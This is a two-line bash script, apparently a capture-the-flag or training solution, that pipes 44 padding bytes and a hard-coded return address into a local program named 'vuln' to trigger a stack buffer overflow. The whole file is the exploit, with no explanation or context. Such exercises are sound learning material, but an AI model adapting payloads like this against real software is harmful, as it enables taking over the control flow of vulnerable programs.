#! /bin/bash

python -c 'print "A"*44+"\xcb\x85\x04\x08"' | ./vuln                                                                                  
